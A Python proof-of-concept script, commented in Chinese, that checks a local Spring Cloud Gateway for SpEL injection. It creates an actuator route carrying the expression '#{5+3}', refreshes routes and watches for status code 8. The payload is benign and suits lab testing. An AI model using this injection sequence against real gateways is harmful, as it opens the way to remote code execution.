import requests
import sys

# 强制禁用所有代理
NO_PROXY = {"http": None, "https": None}

target = "http://127.0.0.1:8081"

print("[*] 脚本开始运行...")

# 测试连通性
try:
    test_resp = requests.get(f"{target}/actuator/health", proxies=NO_PROXY, timeout=5)
    print(f"[+] 连通性正常，状态码: {test_resp.status_code}")
except Exception as e:
    print(f"[-] 连通性测试失败: {e}")
    sys.exit(1)

# ========== 使用 SetStatus 绕过 uri 外网依赖 ==========
data = {
    "id": "test",
    "predicates": [{"name": "Path", "args": {"_genkey_0": "/test/**"}}],
    "filters": [
        {
            "name": "SetStatus",
            "args": {
                "status": "#{5+3}"
            }
        }
    ],
    "uri": "http://localhost",  # 随便写，不影响检测
    "order": 0
}
# ===================================================

# 先删除旧路由
try:
    requests.delete(f"{target}/actuator/gateway/routes/test", proxies=NO_PROXY, timeout=5)
except:
    pass

# 1. 创建路由（看状态码是不是 8）
print("[*] 正在创建路由（SetStatus + SpEL）...")
try:
    r1 = requests.post(f"{target}/actuator/gateway/routes/test", json=data, proxies=NO_PROXY, timeout=10)
    print(f"创建路由状态码: {r1.status_code}")
    
    # 如果状态码是 8，说明 SpEL 执行成功
    if r1.status_code == 8:
        print("[+] 检测到 SpEL 执行成功！漏洞存在！（状态码=8）")
        sys.exit(0)
    elif r1.status_code == 201:
        print("[-] 创建路由成功但状态码不是 8，可能该版本利用方式不同")
    else:
        print(f"[-] 创建路由失败，状态码: {r1.status_code}")
        
except Exception as e:
    print(f"[-] 创建路由失败: {e}")
    sys.exit(1)

# 2. 刷新路由
print("[*] 正在刷新路由...")
try:
    r2 = requests.post(f"{target}/actuator/gateway/refresh", proxies=NO_PROXY, timeout=10)
    print(f"刷新路由状态码: {r2.status_code}")
except requests.exceptions.Timeout:
    print("[!] 刷新超时，SpEL 可能已触发")
except Exception as e:
    print(f"[-] 刷新失败: {e}")
    sys.exit(1)

# 3. 触发执行（检查状态码是否为 8）
print("[*] 正在触发执行...")
try:
    r3 = requests.get(f"{target}/test/xxx", proxies=NO_PROXY, timeout=10, allow_redirects=False)
    print(f"触发状态码: {r3.status_code}")
    
    if r3.status_code == 8:
        print("[+] 检测到 SpEL 执行成功！漏洞存在！（状态码=8）")
    else:
        print(f"[-] 预期状态码 8，实际得到 {r3.status_code}")
        print("[-] 该版本可能无法通过此方式利用")
except Exception as e:
    print(f"[-] 触发失败: {e}")